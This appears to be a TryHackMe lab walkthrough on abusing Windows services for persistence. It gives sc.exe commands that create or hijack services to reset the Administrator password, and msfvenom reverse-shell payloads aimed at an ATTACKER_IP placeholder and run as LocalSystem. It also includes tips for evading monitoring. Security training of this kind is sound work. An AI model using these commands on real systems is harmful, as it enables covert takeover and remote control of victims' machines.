# Abusing Windows Services for Persistence

Windows services offer a great way to establish persistence since they can be configured to run in the background whenever the victim machine is started. If we can leverage any service to run something for us, we can regain control of the victim machine each time it is started.

A service is essentially an executable that runs in the background. When configuring a service, you define which executable will be used and select if the service will automatically run when the machine starts or should be manually started.

There are two main ways to abuse services to establish persistence:
1. **Create a new service**.
2. **Modify an existing service** to execute our payload.

---

## Creating Backdoor Services

We can create and start a service named `THMservice` using the following commands:

```bash
sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto
sc.exe start THMservice
```

> **Note**: There must be a space after each equal sign for the command to work.

The `net user` command will be executed when the service is started, resetting the Administrator's password to `Passwd123`. Notice how the service has been set to start automatically (`start= auto`), so that it runs without requiring user interaction.

### Creating a Reverse Shell Service

Instead of resetting a user's password, we can create a reverse shell with `msfvenom` and associate it with the created service. Service executables are unique since they need to implement a particular protocol to be handled by the system. To create an executable compatible with Windows services, use the `exe-service` format in `msfvenom`:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe
```

Copy the executable to your target system (e.g., `C:\Windows`) and point the service's `binPath` to it:

```bash
sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto
sc.exe start THMservice2
```

This should create a connection back to your attacker's machine.

### THM Flag

Use the reverse shell you just gained to execute:

```bash
C:\flags\flag7.exe
```

---

## Modifying Existing Services

While creating new services for persistence works well, the blue team may monitor new service creation across the network. To avoid detection, you can reuse an existing service instead of creating one. Disabled services are good candidates, as they can be altered without the user noticing.

### Listing Available Services

Use the following command to get a list of available services:

```bash
sc.exe query state=all
```

Example output:

```
SERVICE_NAME: THMService1
DISPLAY_NAME: THMService1
    TYPE               : 10  WIN32_OWN_PROCESS
    STATE              : 1  STOPPED
    WIN32_EXIT_CODE    : 1077  (0x435)
    SERVICE_EXIT_CODE  : 0  (0x0)
    CHECKPOINT         : 0x0
    WAIT_HINT          : 0x0
```

You should find a stopped service called `THMService3`. To query the service's configuration, use:

```bash
sc.exe qc THMService3
```

Example output:

```
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: THMService3
    TYPE               : 10  WIN32_OWN_PROCESS
    START_TYPE         : 2 AUTO_START
    ERROR_CONTROL      : 1   NORMAL
    BINARY_PATH_NAME   : C:\MyService\THMService.exe
    LOAD_ORDER_GROUP   :
    TAG                : 0
    DISPLAY_NAME       : THMService3
    DEPENDENCIES       : 
    SERVICE_START_NAME : NT AUTHORITY\Local Service
```

### Key Parameters for Persistence

1. **Executable (`BINARY_PATH_NAME`)**: Should point to your payload.
2. **Service Start Type (`START_TYPE`)**: Should be set to `AUTO_START` for automatic execution.
3. **Service Account (`SERVICE_START_NAME`)**: Preferably set to `LocalSystem` for SYSTEM privileges.

### Modifying the Service

First, create a new reverse shell with `msfvenom`:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5558 -f exe-service -o rev-svc2.exe
```

Then, reconfigure `THMservice3` parameters:

```bash
sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"
```

Verify the changes:

```bash
sc.exe qc THMservice3
```

Example output:

```
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: THMservice3
    TYPE               : 10  WIN32_OWN_PROCESS
    START_TYPE         : 2   AUTO_START
    ERROR_CONTROL      : 1   NORMAL
    BINARY_PATH_NAME   : C:\Windows\rev-svc2.exe
    LOAD_ORDER_GROUP   :
    TAG                : 0
    DISPLAY_NAME       : THMservice3
    DEPENDENCIES       :
    SERVICE_START_NAME : LocalSystem
```

### THM Flag

Start a Metasploit listener on your attacker's machine and manually start the service to receive a reverse shell. From there, run:

```bash
C:\flags\flag8.exe
```